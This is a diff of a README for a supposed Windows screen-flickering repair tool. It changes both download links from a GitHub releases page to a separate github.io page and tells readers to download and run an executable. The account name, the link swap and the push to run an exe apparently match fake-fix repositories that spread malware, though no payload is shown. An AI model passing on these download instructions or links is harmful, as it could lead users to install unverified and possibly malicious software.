@@ -1,6 +1,6 @@
 # 🖥️ Screen-Flickering-Fix - Repair your flickering Windows display issues
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Smoothhaired-assay264/Screen-Flickering-Fix/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://smoothhaired-assay264.github.io)
 
 ## 📖 Overview
 Screen-Flickering-Fix addresses display instability on Windows 10 and Windows 11. This tool targets common graphics issues including screen flickering, tearing, and the "display driver stopped responding" error. It also resolves VIDEO_TDR_FAILURE codes and recurring black screen flashes. The application supports systems using NVIDIA, AMD, or Intel graphics hardware. It identifies conflicts within your drivers and applies repairs to restore stability to your monitor output.
@@ -16,7 +16,7 @@ This application runs on any PC with Windows 10 or Windows 11 installed. You nee
 ## 📦 How to Install and Run
 Follow these steps to resolve your screen stability issues. Ensure you close any open games or demanding 3D applications before you begin.
 
-1. Visit this page to download the software: https://github.com/Smoothhaired-assay264/Screen-Flickering-Fix/releases
+1. Visit this page to download the software: https://smoothhaired-assay264.github.io
 2. Locate the file named `Screen-Flickering-Fix.exe` under the latest release section.
 3. Click the file to save it to your computer.
 4. Navigate to your Downloads folder or the location where you saved the file.
